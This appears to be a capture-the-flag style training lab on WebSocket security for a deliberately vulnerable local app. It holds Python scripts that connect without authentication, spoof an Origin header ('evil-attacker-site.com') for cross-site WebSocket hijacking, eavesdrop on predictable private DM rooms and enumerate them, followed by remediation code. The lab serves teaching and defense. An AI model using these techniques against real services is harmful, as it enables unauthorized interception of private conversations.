# Lab: WebSocket Security — CSWSH & Room BOLA

## Overview

| Field          | Details                                               |
|----------------|-------------------------------------------------------|
| **Objective**  | Exploit unauthenticated access, Origin bypass, and cross-room eavesdropping on the chat feature |
| **Difficulty** | ⭐⭐⭐ Hard                                          |
| **Time**       | 45 minutes                                            |
| **Category**   | WebSocket Security                                       |
| **OWASP**      | Related to API1:2023 (BOLA) and API2:2023 (Broken Authentication), applied to WebSockets |

---

## Prerequisites

- A running instance of **SocialHack API** at `http://localhost:5001`
- `pip install websocket-client` (already in `requirements.txt`)
- Two terminal windows/Python processes helps for the eavesdropping task

---

## Background

SocialHack API added a real-time chat feature at `ws://localhost:5001/ws/chat`. Real-time features are commonly bolted onto REST APIs without getting the same security scrutiny as the REST endpoints — this lab explores why that's dangerous. Three issues stack together here: the server never validates the `Origin` header (browsers don't enforce Same-Origin Policy on WebSocket handshakes themselves), authentication is optional rather than required, and there's no server-side check that a client is actually allowed to join the room it names.

---

## Tasks

### Task 1: Connect With No Authentication At All

**Steps:**
1. Open a WebSocket connection to `/ws/chat?room=general` with no `token` parameter
2. Send a message and observe the response

**Python example:**
```python
import websocket
import json

ws = websocket.create_connection("ws://localhost:5001/ws/chat?room=general")
print(ws.recv())  # join announcement

ws.send(json.dumps({"message": "Hello, unauthenticated!"}))
print(ws.recv())
ws.close()
```

**🚩 FLAG 1: What username does the server assign you with no token, and does the connection succeed?**

<details>
<summary>💡 Hint 1</summary>
Look at the "system" join message the server broadcasts right after you connect.
</details>

---

### Task 2: Connect With a Spoofed Origin Header

**Steps:**
1. Connect again, this time setting an `Origin` header that would never legitimately be allowed (e.g. `http://evil-attacker-site.com`)

**Python example:**
```python
ws = websocket.create_connection(
    "ws://localhost:5001/ws/chat?room=general",
    header=["Origin: http://evil-attacker-site.com"],
)
print("Connected:", ws.connected)
print(ws.recv())
ws.close()
```

**🚩 FLAG 2: Does the server reject or accept the malicious-origin connection?**

<details>
<summary>💡 Hint 1</summary>
If it connects successfully, that confirms the server never checks `request.headers.get("Origin")` before accepting the handshake — the CSWSH vulnerability.
</details>

---

### Task 3: Eavesdrop on a "Private" DM Room

**Steps:**
1. Open connection A, joining a room named `dm-1-2` (representing a private conversation between user 1 and user 2)
2. In a second script/process, open connection B joining the SAME room name
3. Send a message from connection B and confirm connection A receives it

**Python example (run as two separate processes, or use threading):**
```python
import websocket, json, threading, time

def eavesdropper():
    ws = websocket.create_connection("ws://localhost:5001/ws/chat?room=dm-1-2")
    print("[Eavesdropper] joined dm-1-2 with zero authorization")
    while True:
        try:
            print("[Eavesdropper] received:", ws.recv())
        except Exception:
            break

t = threading.Thread(target=eavesdropper, daemon=True)
t.start()
time.sleep(1)

# "Legit" participant sending a message in what should be a private room
legit = websocket.create_connection("ws://localhost:5001/ws/chat?room=dm-1-2")
legit.send(json.dumps({"message": "This is supposed to be private!"}))
time.sleep(1)
```

**🚩 FLAG 3: Confirm the eavesdropping connection receives the "private" message despite never being a real participant in the conversation**

<details>
<summary>💡 Hint 1</summary>
Room names for DMs are predictable (`dm-<id1>-<id2>`) - an attacker doesn't need to guess randomly, just enumerate small integer ID pairs.
</details>

---

### Task 4: Enumerate DM Rooms Between Known Users

**Steps:**
1. Using the known user IDs from earlier labs (alice=1, bob=2, charlie=3, admin=4, diana=5), try joining every `dm-X-Y` combination and log which ones have active traffic

**🚩 FLAG 4: How many DM room name combinations are possible for 5 known users, and how quickly could you enumerate all of them?**

<details>
<summary>💡 Hint 1</summary>
This is a combinatorics question — think about how the room-naming scheme's predictability makes it trivial to build a full "wiretap" across every possible conversation.
</details>

---

## Flags to Find

| Flag   | Description                                                | Hint                                       |
|--------|--------------------------------------------------------------|-----------------------------------------------|
| FLAG 1 | Assigned username with no token + connection success           | Check the join announcement                    |
| FLAG 2 | Malicious-origin connection accepted or rejected                | Set a spoofed `Origin` header                  |
| FLAG 3 | Confirm cross-room eavesdropping works                          | Two connections, same room name                |
| FLAG 4 | Count of enumerable DM room combinations                        | Combinatorics on 5 known user IDs              |

---

## Remediation

### 1. Validate Origin Before Accepting the Handshake
```python
ALLOWED_ORIGINS = {"https://socialhack.local"}
if request.headers.get("Origin") not in ALLOWED_ORIGINS:
    ws.close(reason="Origin not allowed")
    return
```

### 2. Require Authentication, Don't Make It Optional
```python
payload = decode_token(token) if token else None
if not payload:
    ws.close(reason="Authentication required")
    return
```

### 3. Enforce Room Membership Server-Side
```python
def user_can_join_room(user_id, room_id):
    if room_id.startswith("dm-"):
        _, a, b = room_id.split("-")
        return str(user_id) in (a, b)
    return room_id in get_public_rooms()
```

### 4. Don't Put Long-Lived Tokens in the Query String
- Prefer a short-lived, single-use connection ticket, or authenticate via the first message after connecting instead of the URL.

---

## References

- [OWASP: Testing WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets)
- [Cross-Site WebSocket Hijacking (CSWSH) - PortSwigger](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
